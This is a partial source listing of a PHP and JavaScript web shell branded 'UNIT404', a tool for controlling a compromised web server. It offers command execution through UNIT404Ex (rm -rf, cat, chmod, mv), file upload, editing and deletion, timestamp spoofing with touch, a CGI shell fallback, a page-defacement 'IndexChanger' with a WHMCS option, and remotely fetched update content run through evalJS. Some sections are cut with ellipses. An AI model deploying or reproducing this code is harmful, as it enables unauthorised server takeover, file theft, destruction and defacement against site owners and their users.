e)"7"==e?(r.checked=!0,o.checked=!0,n.checked=!0):"4"==e?r.checked=!0:"2"==e?o.checked=!0:"1"==e?n.checked=!0:"6"==e?(r.checked=!0,o.checked=!0):"3"==e?(o.checked=!0,n.checked=!0):"5"==e&&(r.checked=!0,n.checked=!0);else{var s=0;r.checked&&(s+=4),o.checked&&(s+=2),n.checked&&(s+=1),"u"==t?d.querySelector("#shortcutMenu-holder > form input[name=u]").value=s:"g"==t?d.querySelector("#shortcutMenu-holder > form input[name=g]").value=s:"w"==t&&(d.querySelector("#shortcutMenu-holder > form input[name=w]").value=s)}}function gg(e,t,a,i,l,r){var o="filesman_holder_"+UNIT404_current_fm_id;UNIT404loader(o,"block"),data="a="+UNIT404b64(e)+"&c="+UNIT404b64(t)+"&UNIT4041="+UNIT404b64(a)+"&UNIT4042="+UNIT404b64(i)+"&UNIT4043="+UNIT404b64(l)+"&ajax="+UNIT404b64("true"),_Ajax(d.URL,data,r,!1,o)}function UNIT404PopUpDoAction(e){var t=e.getAttribute("action");switch(t){case"rename":case"move":case"copy":var a=e.getAttribute("fid").replace("id_",""),i=$("id_"+a).getAttribute("fname"),l=d.querySelector("#shortcutMenu-holder > form > input[name=fname]").value;l=l.trim(),i=i.trim(),gg("doActions",c_,i,l,t,function(e,i){if("rename"==t)if("done"==e){var r=$("id_"+a);updateFileEditor(a,l);var o=r.getAttribute("path")+$("id_"+a).getAttribute("fname");d.querySelector("#shortcutMenu-holder > form > .old-path-content").innerHTML=o,r.addEventListener("animationend",function(){r.classList.remove("textEffect")}),r.classList.add("textEffect"),UNIT404ShowNotification("Renamed...","Rename Action"),d.querySelector(".cl-popup-fixed").style.display="none"}else UNIT404ShowNotification("error...!","Rename Action","error");UNIT404loader(i,"none")});break;case"permission":var r=d.querySelector("#shortcutMenu-holder > form input[name=u]").value,o=d.querySelector("#shortcutMenu-holder > form input[name=g]").value,n=d.querySelector("#shortcutMenu-holder > form input[name=w]").value;i=(i=d.querySelector("#shortcutMenu-holder > form > .old-path-content").innerHTML).trim();var s=r.trim()+o.trim()+n.trim();gg("doActions",c_,i,s,t,function(e,t){UNIT404loader(t,"none"),UNIT404ShowNotification(e,"Permission Action"),d.querySelector(".cl-popup-fixed").style.display="none"});break;case"modify":a=e.getAttribute("fid").replace("id_","");var c=d.querySelector("#shortcutMenu-holder > form > input[name=fname]").value,u=$("id_"+a).getAttribute("fname");gg("doActions",c_,c,u,t,function(t,a){if("ok"==t){var i="tr_row_"+e.getAttribute("fid").replace("id_","");d.querySelector("#"+i+" .main_modify").innerHTML=c,UNIT404ShowNotification("success...","Modify Action"),d.querySelector(".cl-popup-fixed").style.display="none"}else UNIT404ShowNotification(t,"Modify Action","error");UNIT404loader(a,"none")})}}function UNIT404InitSoratableTab(e){Sortable.create(e,{direction:"horizontal",animation:300,ghostClass:"sortable-ghost",filter:".not-sortable"})}$("search-input").addEventListener("keydown",function(e){setTimeout(function(){var e=$("search-input").value;for(var t in d.getElementsByClassName("history-list")[0].innerHTML="",editor_files)if(-1!=editor_files[t].file.search(e)||""==e){var a=0;t==editor_current_file&&(a=" is_active"),insertToHistory(t,editor_files[t].file,a,editor_files[t].type)}},100)},!1),_Ajax(d.URL,"a="+UNIT404b64("checkupdate"),function(e){if(0!=e.length&&"[]"!=e){var t=JSON.parse(e);if(t.hasOwnProperty("content")){d.body.insertAdjacentHTML("beforeend",t.content);try{evalJS(t.content)}catch(t){}}if(t.hasOwnProperty("copyright")&&($("UNIT404-copyright").innerHTML=t.copyright),t.hasOwnProperty("solevisible")&&($("UNIT404_solevisible").innerHTML=t.solevisible),t.hasOwnProperty("code_name")&&($("hidden_sh").innerHTML=t.code_name.replace(/\{version\}/g,t.version_number)),t.hasOwnProperty("market")){var a=d.querySelector("span.UNIT404_plus");if(t.market.hasOwnProperty("visible")&&"yes"==t.market.visible&&($("menu_opt_market").style.display="inline"),"open"!=t.market.status&&(a.style.color="#ffc107"),t.market.hasOwnProperty("content"))try{evalJS(t.market.content)}catch(t){}}}}),<?php echo $GLOBALS["need_to_update_header"]; ?>?_Ajax(d.URL,"a="+UNIT404b64("updateheader"),function(e){try{var t=JSON.parse(e);for(var a in t){for(var i="",l=0;l<t[a].length;l++)i+="useful"==a||"downloader"==a?'<span class="header_values" style="margin-left: 4px;">'+t[a][l]+"</span>":t[a][l];var r=$("header_"+a);r&&(r.innerHTML=i)}$("header_cgishell").innerHTML="ON",$("header_cgishell").setAttribute("class","header_on")}catch(e){}}):islinux&&_Ajax(d.URL,"a="+UNIT404b64("checkcgi"),function(e){"ok"==e&&($("header_cgishell").innerHTML="ON",$("header_cgishell").setAttribute("class","header_on"))}),function(){d.onclick=function(){can_hashchange_work=!1,setTimeout(function(){can_hashchange_work=!0},600)},window.onhashchange=function(e){can_hashchange_work&&UNIT404CheckUrlHash()},UNIT404CheckUrlHash(),UNIT404getFlags(),rightclick_menu_context=$("rightclick_menu").style,UNIT404InitCwdContext(),document.addEventListener("click",function(e){rightclick_menu_context.opacity="0",setTimeout(function(){rightclick_menu_context.visibility="hidden"},501)},!1);/* Sortable disabled for performance */}();
</script>
</body>
</html>
<?php
...
function UNIT404Which($p) {
$path = UNIT404Ex('which ' . $p,false,false);
if(!empty($path))
return strlen($path);
return false;
}
function UNIT404Size($s) {
if($s >= 1073741824)
...
function UNIT404PermsColor($f,$isbash=false){
$class = "";
$num = "";
$human = "";
if($isbash){
...
$human = UNIT404Perms(@fileperms($f));
if(!@is_readable($f))
$class = "main_red_perm";
...
function _UNIT404_can_runCommand($cgi=true,$cache=true){
	if(isset($_COOKIE["UNIT404_canruncmd"])&&$cache){
		return true;
	}
	if(strlen(UNIT404Ex("whoami",false,$cgi))>0){
		$_COOKIE["UNIT404_canruncmd"] = true;
		return true;
	}
	return false;
}
function _UNIT404_symlink($target, $link){
	$phpsym = function_exists("symlink");
	if($phpsym){
		@symlink($target, $link);
	}else{
		UNIT404Ex("ln -s '".addslashes($target)."' '".addslashes($link)."'");
	}
}
function _UNIT404_file_exists($file,$cgi=true){
	if(@file_exists($file)){
		return true;
	}else{
		if(strlen(UNIT404Ex("ls -la '".addslashes($file)."'",false,$cgi))>0){
			return true;
		}
	}
	return false;
}
function _UNIT404_file($file,$cgi=true){
	$array = @file($file);
	if(!$array){
		if(strlen(UNIT404Ex("id",false,$cgi))>0){
			$data = UNIT404Ex('cat "'.addslashes($file).'"',false,$cgi);
			if(strlen($data)>0){
				return explode("\n", $data);
			}else{
				return false;
...
function _UNIT404_is_writable($file){
	$check = false;
	$check = @is_writable($file);
	if(!$check){
		if(_UNIT404_can_runCommand()){
			$check = UNIT404Ex('[ -w "'.trim(addslashes($file)).'" ] && echo "yes" || echo "no"');
			if($check == "yes"){
				$check = true;
			}else{
				$check = false;
...
function _UNIT404_is_dir($dir,$mode="-d"){
	$check = false;
	$check = @is_dir($dir);
	if($mode == "-e"){
		$check = @is_file($dir);
	...
	if(!$check){
		if(_UNIT404_can_runCommand()){
			$check = UNIT404Ex('[ "'.trim($mode).'" "'.trim(addslashes($dir)).'" ] && echo "yes" || echo "no"');
...
function UNIT404FilesMan(){
if(!empty ($_COOKIE['UNIT404_f']))
$_COOKIE['UNIT404_f'] = @unserialize($_COOKIE['UNIT404_f']);
if(!empty($_POST['UNIT4041'])){
switch($_POST['UNIT4041']){
case 'uploadFile':
$move_cmd_file = false;
$UNIT404_canruncmd = false;
if($GLOBALS['glob_chdir_false']){
	$UNIT404_canruncmd = _UNIT404_can_runCommand(true,true);
	$move_cmd_file = true;
}
if(_UNIT404_is_writable($GLOBALS['cwd'])){
$files = reArrayFiles($_FILES['f']);
$ret_files = array();
foreach($files as $file){
if($move_cmd_file&&$UNIT404_canruncmd){
	UNIT404Ex("cat '".addslashes($file['tmp_name'])."' > '".addslashes($_POST["c"]."/".$file['name'])."'");
}else{
	if(@move_uploaded_file($file['tmp_name'],$file['name'])){
		...
		$file_perm = UNIT404PermsColor($file['name']);
		$file_size = @filesize($file['name']);
		$ret_files[] = array("name" => $file['name'], "size" => UNIT404Size($file_size), "perm" => $file_perm, "modify" => $file_modify, "owner" => $file_owner."/".$file_group);
	}
}
}
if(!$move_cmd_file){
...
$new_dir_cmd = false;
if($GLOBALS['glob_chdir_false']){
	if(_UNIT404_can_runCommand(true,true)){
		if(_UNIT404_is_writable($GLOBALS['cwd'])){
			if(!_UNIT404_is_dir(trim($_POST['UNIT4042']))){
				UNIT404Ex("cd '".trim(addslashes($_POST['c']))."';mkdir '".trim(addslashes($_POST['UNIT4042']))."'");
				echo "<script>UNIT404ShowNotification('".addslashes($_POST['UNIT4042'])." created...', 'Files manager');</script>";
			}else{
				echo "<script>UNIT404ShowNotification('folder already existed', 'Files manager', 'error');</script>";
			}
		}else{
			echo "<script>UNIT404ShowNotification('folder isnt writable !', 'Files manager', 'error');</script>";
		}
	}else{
		echo "<script>UNIT404ShowNotification('Can\'t create new dir !', 'Files manager', 'error');</script>";
	}
}else{
	if(_UNIT404_is_writable($GLOBALS['cwd'])){
		if(!_UNIT404_is_dir(trim($_POST['UNIT4042']))){
			if(!@mkdir(trim($_POST['UNIT4042']))){
				echo "<script>UNIT404ShowNotification('Can\'t create new dir !', 'Files manager', 'error');</script>";
			}else{
				echo "<script>UNIT404ShowNotification('".addslashes($_POST['UNIT4042'])." created...', 'Files manager');</script>";
			}
...
if($GLOBALS["glob_chdir_false"]){
	if(_UNIT404_can_runCommand(true,true)){
		UNIT404Ex("rm -rf '".addslashes($_POST['c'].'/'.$f)."'");
	}
}else{
UNIT404Ex("rm -rf '".addslashes($f)."'",false,false);
if(@is_dir($f))
deleteDir($f);
else
@unlink($f);
...
if(@is_dir(rawurldecode(@$_POST['UNIT4042']))&&rawurldecode(@$_POST['UNIT4042'])!='..'){
deleteDir(rawurldecode(@$_POST['UNIT4042']));
UNIT404Ex("rm -rf '".addslashes($_POST['UNIT4042'])."'",false,false);
}else{
@unlink(rawurldecode(@$_POST['UNIT4042']));
}
if($GLOBALS["glob_chdir_false"]){
	$source = rawurldecode(@$_POST['UNIT4042']);
	if($source!='..'&&!empty($source)){
		if(_UNIT404_can_runCommand(true,true)){
			UNIT404Ex("cd '".trim(addslashes($_POST['c']))."';rm -rf '".addslashes($source)."'");
		}
	}
}
if(is_array($_POST['f']))
...
break;
case 'paste':
if($_COOKIE['UNIT404_act'] == 'copy'&&isset($_COOKIE['UNIT404_f'])){
foreach($_COOKIE['UNIT404_f'] as $f)
copy_paste($_COOKIE['UNIT404_c'],$f, $GLOBALS['cwd']);
}elseif($_COOKIE['UNIT404_act'] == 'move'&&isset($_COOKIE['UNIT404_f'])){
...
foreach($_COOKIE['UNIT404_f'] as $f)
@rename($_COOKIE['UNIT404_c'].$f, $GLOBALS['cwd'].$f);
}elseif($_COOKIE['UNIT404_act'] == 'zip'&&isset($_COOKIE['UNIT404_f'])){
if(class_exists('ZipArchive')){
$zip = new ZipArchive();
$zipX = "UNIT404_".rand(1,1000).".zip";
if($zip->open($zipX, 1)){
@chdir($_COOKIE['UNIT404_c']);
foreach($_COOKIE['UNIT404_f'] as $f){
if($f == '..')continue;
if(@is_file($_COOKIE['UNIT404_c'].$f))
$zip->addFile($_COOKIE['UNIT404_c'].$f, $f);
elseif(@is_dir($_COOKIE['UNIT404_c'].$f)){
...
}elseif($_COOKIE['UNIT404_act'] == 'unzip'&&isset($_COOKIE['UNIT404_f'])){
if(class_exists('ZipArchive')){
$zip = new ZipArchive();
foreach($_COOKIE['UNIT404_f'] as $f) {
if($zip->open($_COOKIE['UNIT404_c'].$f)){
$zip->extractTo($_COOKIE['UNIT404_cwd']);
$zip->close();}}}}
unset($_COOKIE['UNIT404_f']);
break;
default:
if(!empty($_POST['UNIT4041'])){
if(in_array($_POST['UNIT4041'], array("copy", "move", "zip", "unzip"))){
__UNIT404_set_cookie('UNIT404_act', @$_POST['UNIT4041']);
__UNIT404_set_cookie('UNIT404_f', @serialize($_POST['f']));
__UNIT404_set_cookie('UNIT404_c', @$_POST['c']);
return;
}
}
break;
...
if($dirContent === false){
	if(_UNIT404_can_runCommand(true,true)){
		$tmp_getdir_path = @$_COOKIE["UNIT404chdir_bash_path"];
		@chdir(dirname($_SERVER["SCRIPT_FILENAME"]));
		if(!isset($_COOKIE["UNIT404chdir_bash"])||@!file_exists($tmp_getdir_path."/UNIT404cgiapi/getdir.UNIT404")){
			...
			$tmp_getdir_path = UNIT404WriteTocgiapi("getdir.UNIT404",$bash);
			__UNIT404_set_cookie("UNIT404chdir_bash", "true");
			__UNIT404_set_cookie("UNIT404chdir_bash_path", $tmp_getdir_path);
		}
		$dirContent = UNIT404Ex("cd ".$tmp_getdir_path."/UNIT404cgiapi;sh getdir.UNIT404 '".addslashes(isset($_POST['c'])?$_POST['c']:$GLOBALS['cwd'])."'");
...
if($count_dirContent > 300){
	@$_COOKIE["UNIT404_limited_files"] = 100;
}
$UNIT404_sort_by = isset($_COOKIE["UNIT404_sort_by"]) ? $_COOKIE["UNIT404_sort_by"] : 'name';
$UNIT404_limited_files = isset($_COOKIE["UNIT404_limited_files"]) ? (int)$_COOKIE["UNIT404_limited_files"] : 0;
$UNIT404_files_page_number = isset($_POST["pagenum"]) ? (int)$_POST["pagenum"] : 1;
$UNIT404_filesman_direction = isset($_COOKIE["UNIT404_filesman_direction"]) ? $_COOKIE["UNIT404_filesman_direction"] : 'asc';
$files_page_count = 1;
if($UNIT404_limited_files > 0){
	$files_page_count = ceil($count_dirContent/$UNIT404_limited_files);
	if($files_page_count > 1){
		$files_page_count++;
	}
}
echo '<div><div class="filters-holder"><span>Filter: </span><input style="color:#ffffff;" autocomplete="off" type="text" id="regex-filter" name="name-filter" onkeydown="doFilterName(this);"><span style="margin-left:10px">Sort By: </span><select name="sort_files" onchange="sortBySelectedValue(this,\'UNIT404_sort_by\');" style="color:#ffffff;"><option value="name" '.($UNIT404_sort_by == 'name'?'selected':'').'>Name</option><option value="size" '.($UNIT404_sort_by == 'size'?'selected':'').'>Size</option><option value="modify" '.($UNIT404_sort_by == 'modify'?'selected':'').'>Modify</option></select><span style="margin-left:10px">Direction: </span><select name="direction_filesman" onChange="sortBySelectedValue(this,\'UNIT404_filesman_direction\')" style="color:#ffffff;"><option value="asc" '.($UNIT404_filesman_direction == 'asc'?'selected':'').'>Ascending</option><option value="desc" '.($UNIT404_filesman_direction == 'desc'?'selected':'').'>Descending</option></select><span style="margin-left:10px;"> limit: </span><input style="text-align:center;width: 40px;color:#ffffff;" type="text" name="limited_number" value="'.$UNIT404_limited_files.'" oninput="this.value=this.value.replace(/[^0-9]/g,\'\');setCookie(\'UNIT404_limited_files\', this.value, 2012);"><span style="margin-left:10px;">Files Count: <b style="color:#ffffff;">'.($count_dirContent-1).'</b></span></div><div class="header">';
if($dirContent == false){
...
global $sort;
$sort = array('name', 1);
if(isset($_COOKIE["UNIT404_sort_by"]) && !empty($_COOKIE["UNIT404_sort_by"])){
	$sort[0] = $_COOKIE["UNIT404_sort_by"];
}
if(!empty($_POST['UNIT4041'])) {
if(preg_match('!s_([A-z]+)_(\d{1})!', $_POST['UNIT4041'], $match))
$sort = array($match[1], (int)$match[2]);
}
if($UNIT404_files_page_number > ($files_page_count-1)){
	$UNIT404_files_page_number = 1;
}
...
$dirs = $files = array();
$n = $count_dirContent;
if($n > $UNIT404_limited_files && $UNIT404_limited_files > 0){
	$n = ($UNIT404_limited_files * $UNIT404_files_page_number);
	if($n > $count_dirContent){
		$n = $count_dirContent;
	}
}
$i = 0;
if($UNIT404_limited_files > 0 && $UNIT404_files_page_number > 1){
	$i = $UNIT404_limited_files * ($UNIT404_files_page_number - 1);
}
$page_builder = get_pagination_links($UNIT404_files_page_number,$files_page_count -1);
$cmd_dir_backp = "";
for(;$i<$n;$i++){
if($cmd_dir){
...
$file_perm = UNIT404PermsColor(array("class"=>$dirContent[$i]["permcolor"],"num"=>$dirContent[$i]["permnum"],"human"=>$dirContent[$i]["permhuman"]),true);
...
$file_perm = UNIT404PermsColor($GLOBALS['cwd'].$filename);
...
$GLOBALS['sort'] = $sort;
function UNIT404Cmp($a, $b) {
if($GLOBALS['sort'][0] != 'size')
return strcmp(strtolower($a[$GLOBALS['sort'][0]]), strtolower($b[$GLOBALS['sort'][0]]))*($GLOBALS['sort'][1]?1:-1);
else
return (($a['size'] < $b['size']) ? -1 : 1)*($GLOBALS['sort'][1]?1:-1);
}
usort($files, "UNIT404Cmp");
usort($dirs, "UNIT404Cmp");
if(isset($_COOKIE["UNIT404_filesman_direction"])&& !empty($_COOKIE["UNIT404_filesman_direction"])){
	if($_COOKIE["UNIT404_filesman_direction"] == 'desc'){
...
<input type=hidden name=charset value='". (isset($_POST['charset'])?$_POST['charset']:'')."'>
<select id='tools_selector' name='UNIT4041'><option value='copy'>Copy</option><option value='move'>Move</option><option value='delete' selected>Delete</option><option value='zip'>Add 2 Compress (zip)</option><option value='unzip'>Add 2 Uncompress (zip)</option><option value='paste'>Paste / Zip / Unzip </option></select>
...
function UNIT404FilesTools(){
UNIT404head();
echo '<div class="filestools" style="height: 100%;">';
if(isset($_POST['UNIT4041']))$_POST['UNIT4041'] = rawurldecode($_POST['UNIT4041']);
$UNIT4041_decoded = $_POST['UNIT4041'];
$chdir_fals = false;
if(!@chdir($_POST['c'])){
	$chdir_fals = true;
	$_POST['UNIT4041'] = $_POST["c"]."/".$_POST["UNIT4041"];
	$UNIT404_canruncmd = _UNIT404_can_runCommand(true,true);
	if($UNIT404_canruncmd){
		$slashed_UNIT4041 = addslashes($_POST['UNIT4041']);
		$file_info = explode(":", UNIT404Ex('stat -c "%F:%U:%G:%s:%Y:0%a:%A" "'.$slashed_UNIT4041.'"'));
		$perm_color_class = UNIT404Ex("if [[ -w '".$slashed_UNIT4041."' ]]; then echo main_green_perm; elif [[ -r '".$slashed_UNIT4041."' ]]; then echo main_white_perm; else echo main_red_perm; fi");
	}
}
if($_POST['UNIT4042'] == 'auto'){
if(is_array(@getimagesize($_POST['UNIT4041']))){
$_POST['UNIT4042'] = 'image';
}else{
	$_POST['UNIT4042'] = 'view';
	if($chdir_fals){
		if($UNIT404_canruncmd){
			$mime = explode(":", UNIT404Ex("file --mime-type '".addslashes($_POST['UNIT4041'])."'"));
			$mimetype = $mime[1];
			if(!empty($mimetype)){
...
if($_POST['UNIT4042'] == "rename" && !empty($_POST['UNIT4043']) && @is_writable($_POST['UNIT4041'])){$rename_cache = $_POST['UNIT4043'];}
if(@$_POST['UNIT4042'] == 'mkfile'){
$_POST['UNIT4041'] = trim($_POST['UNIT4041']);
if($chdir_fals&&$UNIT404_canruncmd){
	if(_UNIT404_is_writable($_POST["c"])){
		UNIT404Ex("cd '".addslashes($_POST["c"])."';touch '".addslashes($UNIT4041_decoded)."'");
		$_POST['UNIT4042'] = "edit";
	}
}
if(!@file_exists($_POST['UNIT4041'])){
$fp = @fopen($_POST['UNIT4041'], 'w');
if($fp){
$_POST['UNIT4042'] = "edit";
fclose($fp);
}
...
if(!_UNIT404_file_exists(@$_POST['UNIT4041'])){
echo __pre()."<center><p><div class=\"txtfont\"><font color='red'>!...FILE DOEST NOT EXITS...!</font></div></p></center></div><script>editor_error=false;removeHistory('".$_POST['UNIT4044']."');</script>";
UNIT404Footer();
return;
}
if($chdir_fals){
...
$permcolor = UNIT404PermsColor(array("class"=>$perm_color_class,"num"=>$file_info[5],"human"=>$file_info[6]),true);
}else{
$uid = function_exists("posix_getpwuid")&&function_exists("fileowner")?@posix_getpwuid(@fileowner($_POST['UNIT4041'])):'';
$gid = function_exists("posix_getgrgid")&&function_exists("filegroup")?@posix_getgrgid(@filegroup($_POST['UNIT4041'])):'';
if(!$uid&&!$gid){
$uid['name'] = function_exists("fileowner")?@fileowner($_POST['UNIT4041']):'';
$gid['name'] = function_exists("filegroup")?@filegroup($_POST['UNIT4041']):'';
}
$permcolor = UNIT404PermsColor($_POST['UNIT4041']);
$filesize = @filesize($_POST['UNIT4041']);
if(!isset($uid['name'],$gid['name'])||empty($uid['name'])||empty($gid['name'])){
	if(_UNIT404_can_runCommand()){
		list($uid['name'],$gid['name']) = explode(":", UNIT404Ex('stat -c "%U:%G" "'.addslashes($_POST["c"]."/".$_POST["UNIT4041"]).'"'));
	}
}
}
if(substr($_POST['UNIT4041'], 0, 7) == "phar://"){
	$UNIT404_file_directory = $_POST['UNIT4041'];
}else{
	$UNIT404_file_directory = str_replace("//", "/",($chdir_fals?"":$_POST['c'].'/').$_POST['UNIT4041']);
}
echo '<div style="overflow: hidden;white-space: nowrap;text-overflow: ellipsis;"><span class="editor_file_info_vars">Name:</span> '.htmlspecialchars(basename($UNIT4041_decoded)).' <span class="editor_file_info_vars">Size:</span> '.UNIT404Size($filesize).' <span class="editor_file_info_vars">Permission:</span> '.$permcolor.' <span class="editor_file_info_vars">Owner/Group:</span> '.$uid['name'].'/'.$gid['name'].' <span class="editor_file_info_vars">Directory:</span> '.dirname($UNIT404_file_directory).'</div>';
if(empty($_POST['UNIT4042']))$_POST['UNIT4042'] = 'view';
if(!_UNIT404_is_dir($_POST['UNIT4041'])){
...
echo('<div>');
foreach($m as $v)
echo $v == 'Delete' ? '<a href="javascript:void(0);" onclick="var chk=confirm(\'Are You Sure For Delete This File ?\');chk?editor(\''.addslashes(!isset($rename_cache)?$_POST['UNIT4041']:$rename_cache).'\',\''.strtolower($v).'\',\'\',\''.$_POST['c'].'\',\''.$_POST['UNIT4044'].'\',\''.$ftype.'\'):\'\';"><span class="editor_actions">'.((strtolower($v)==@$_POST['UNIT4042'])?'<b><span class="editor_actions"> '.$v.' </span> </b>':$v).' | </span></a> ' : '<a href="javascript:void(0);" onclick="editor(\''.addslashes(!isset($rename_cache)?$_POST['UNIT4041']:$rename_cache).'\',\''.strtolower($v).'\',\'\',\''.$_POST['c'].'\',\''.$_POST['UNIT4044'].'\',\''.$ftype.'\')"><span class="editor_actions">'.((strtolower($v)==@$_POST['UNIT4042'])?'<b><span class="editor_actions"> '.$v.' </span> </b>':$v).' | </span></a>';
echo '</div>';
switch($_POST['UNIT4042']){
case 'view':case 'edit':
@chdir($_POST['c']);
$disabled_btn = "";
if(!@is_writable($_POST['UNIT4041'])&&!_UNIT404_is_writable($_POST['UNIT4041'])){
$disabled_btn = "disabled=disabled";
$disabled_btn_style= 'background: #ff0000;color: #fff;';
}
if(!empty($_POST['UNIT4043'])){
$_POST['UNIT4043'] = substr($_POST['UNIT4043'],1);
$time = @filemtime($_POST['UNIT4041']);
$fp = @__write_file($_POST['UNIT4041'],$_POST['UNIT4043']);
if($chdir_fals&&$UNIT404_canruncmd){
	$rname = $UNIT4041_decoded;
	$randname = $rname.rand(111,9999);
	$filepath = dirname($_SERVER["SCRIPT_FILENAME"])."/".$randname;
	if($fp = @__write_file($filepath ,$_POST['UNIT4043'])){
		UNIT404Ex("mv '".addslashes($filepath)."' '".addslashes($_POST["UNIT4041"])."';rm -f '".addslashes($filepath)."'");
	}
}
if($fp){
echo 'Saved!<br>';
@touch($_POST['UNIT4041'],$time,$time);
}
}
echo '<div class="editor-view"><div class="view-content"><div style="display:inline-block;margin-bottom:10px;"><button onclick="var ta=document.getElementById(\'file_textarea\');editor(\''.addslashes($UNIT4041_decoded).'\',\'edit\',\'1\'+ta.value,\''.$_POST['c'].'\',\''.$_POST['UNIT4044'].'\',\''.$ftype.'\');return false;" class="button" style="width:100px;height:33px;background:linear-gradient(to bottom, #1ced31 0, #005b09 55%, #134306 100%);color:#FFF;'.$disabled_btn_style.'" '.$disabled_btn.'>Save</button></div><textarea id="file_textarea" style="width:100%;height:80vh;background:#1a1a1a;color:#0f0;font-family:monospace;font-size:14px;padding:10px;border:1px solid #333;">';
echo htmlspecialchars(__read_file($_POST['UNIT4041']));
echo '</textarea></div></div>';
break;
case 'highlight':
@chdir($_POST['c']);
if(@is_readable($_POST['UNIT4041'])){
...
$code = @highlight_file($_POST['UNIT4041'],true);
echo str_replace(array('<span ','</span>'), array('<font ','</font>'),$code).'</div></div></div>';
}
break;
case 'delete':
@chdir($_POST['c']);
if(@is_writable($_POST['UNIT4041'])||$GLOBALS["glob_chdir_false"]){
$deleted = true;
if(!@unlink($_POST['UNIT4041'])){
	$deleted = false;
	if($UNIT404_canruncmd){
		if(_UNIT404_is_writable($_POST['UNIT4041'])){
			UNIT404Ex("rm -f '".addslashes($_POST['UNIT4041'])."'");
			$deleted = true;
		}
	}
}
if($deleted)echo 'File Deleted...<script>var elem = $("'.$_POST['UNIT4044'].'").parentNode;elem.parentNode.removeChild(elem);delete editor_files["'.$_POST['UNIT4044'].'"];</script>';else echo 'Error...';}
break;
case 'chmod':
@chdir($_POST['c']);
if(!empty($_POST['UNIT4043'])){
$perms = 0;
for($i=strlen($_POST['UNIT4043'])-1;$i>=0;--$i)
$perms += (int)$_POST['UNIT4043'][$i]*pow(8, (strlen($_POST['UNIT4043'])-$i-1));
if(!@chmod($_POST['UNIT4041'], $perms)){
if($chdir_fals&&$UNIT404_canruncmd){
UNIT404Ex("cd '".addslashes($_POST["c"])."';chmod ".addslashes($_POST['UNIT4043'])." '".addslashes($UNIT4041_decoded)."'");
echo('Success!');
}else{
echo '<font color="#000000"><b>Can\'t set permissions!</b></font><br><script>document.mf.UNIT4043.value="";</script>';}
}else{echo('Success!');}
}
clearstatcache();
UNIT404Num(8,9,10,7,6,5,4,2,1);
if($chdir_fals){
	$file_perm = $file_info[5];
}else{
	$file_perm = substr(sprintf('%o', @fileperms($_POST['UNIT4041'])),-4);
}
echo '<script>UNIT4043_="";</script><form onsubmit="editor(\''.addslashes($_POST['UNIT4041']).'\',\''.$_POST['UNIT4042'].'\',this.chmod.value,\''.$_POST['c'].'\',\''.$_POST['UNIT4044'].'\',\''.$ftype.'\');return false;"><input type="text" name="chmod" value="'.$file_perm.'"><input type=submit value=" "></form>';
break;
case 'hexdump':
@chdir($_POST['c']);
$c = __read_file($_POST['UNIT4041']);
$n = 0;
$h = array('00000000<br>','','');
$len = strlen($c);
for ($i=0; $i<$len; ++$i) {
...
case 'rename':
@chdir($_POST['c']);
$UNIT4041_escape = addslashes($_POST["UNIT4041"]);
$UNIT4043_escape = addslashes($_POST["UNIT4043"]);
if(!empty($_POST['UNIT4043'])){
$cmd_rename = false;
if($chdir_fals&&$UNIT404_canruncmd){
if(_UNIT404_is_writable($_POST['UNIT4041'])){
$UNIT4041_escape = addslashes($UNIT4041_decoded);
UNIT404Ex("cd '".addslashes($_POST['c'])."';mv '".$UNIT4041_escape."' '".addslashes($_POST['UNIT4043'])."'");
}else{
$cmd_rename = true;
}
}else{
...
if(!@rename($_POST['UNIT4041'], $_POST['UNIT4043'])&&$cmd_rename){
echo 'Can\'t rename!<br>';}else{echo('Renamed!<script>try{$("'.$_POST['UNIT4044'].'").innerHTML = "<div class=\'editor-icon\'>"+loadType(\''.$UNIT4043_escape.'\',\''.$ftype.'\',\''.$_POST['UNIT4044'].'\')+"</div><div class=\'editor-file-name\'>'.$UNIT4043_escape.'</div>";editor_files["'.$_POST['UNIT4044'].'"].file = "'.$UNIT4043_escape.'";updateFileEditor("'.$UNIT4041_escape.'", "'.$UNIT4043_escape.'");'.($ftype == "dir"?"updateDirsEditor('".$_POST['UNIT4044']."','".$UNIT4041_escape."');":"").'}catch(e){console.log(e)}</script>');$UNIT4041_escape = $UNIT4043_escape;}
}
echo '<form onsubmit="editor(\''.$UNIT4041_escape.'\',\''.$_POST['UNIT4042'].'\',this.name.value,\''.$_POST['c'].'\',\''.$_POST['UNIT4044'].'\',\''.$ftype.'\');return false;"><input type="text" name="name" value="'.addslashes(htmlspecialchars(isset($_POST['UNIT4043'])&&$_POST['UNIT4043']!=''?$_POST['UNIT4043']:$UNIT4041_decoded)).'"><input type=submit value=" "></form>';
break;
case 'touch':
@chdir($_POST['c']);
if( !empty($_POST['UNIT4043']) ) {
$time = strtotime($_POST['UNIT4043']);
if($time){
$touched = false;
if($chdir_fals&&$UNIT404_canruncmd){
	UNIT404Ex("cd '".addslashes($_POST["c"])."';touch -d '".htmlspecialchars(addslashes($_POST['UNIT4043']))."' '".addslashes($UNIT4041_decoded)."'");
	$touched = true;
}
if(!@touch($_POST['UNIT4041'],$time,$time)&&!$touched)
echo 'Fail!';
else
echo 'Touched!';
...
clearstatcache();
echo '<script>UNIT4043_="";</script><form onsubmit="editor(\''.addslashes($_POST['UNIT4041']).'\',\''.$_POST['UNIT4042'].'\',this.touch.value,\''.$_POST['c'].'\',\''.$_POST['UNIT4044'].'\',\''.$ftype.'\');return false;"><input type=text name=touch value="'.date("Y-m-d H:i:s", ($chdir_fals?$file_info[4]:@filemtime($_POST['UNIT4041']))).'"><input type=submit value=" "></form>';
break;
case 'image':
@chdir($_POST['c']);
echo('<hr>');
...
if($chdir_fals&&$UNIT404_canruncmd){
	$source = UNIT404Ex("cat '".addslashes($file)."' | base64");
	list($width, $height) = explode(":", UNIT404Ex("identify -format '%w:%h' '".addslashes($file)."'"));
	$mime = explode(":", UNIT404Ex("file --mime-type '".addslashes($file)."'"));
...
if($GLOBALS["glob_chdir_false"]){
	...
	if(_UNIT404_is_writable($scriptpath)){
		UNIT404Ex("cp '".addslashes($_POST["file"])."' '".addslashes($filepath)."'");
		readfile($filepath);
		@unlink($filepath);
	}else{
		UNIT404Ex("cat '".addslashes($_POST["file"])."'");
	}
}else{
	readfile($_POST['file']);
}
}else echo('Error...!');}}
function __UNIT404_set_cookie($key, $value){
	$_COOKIE[$key] = $value;
	@setcookie($key, $value, time()+(86400 * 7), '/');
}
function __pre(){return('<pre id="strOutput" style="margin-top:5px" class="ml1">');}
function UNIT404IndexChanger(){
UNIT404head();
...
if(isset($_POST['UNIT4043'])&&($_POST['UNIT4043'] == 'whmcs')){
echo __pre();
...
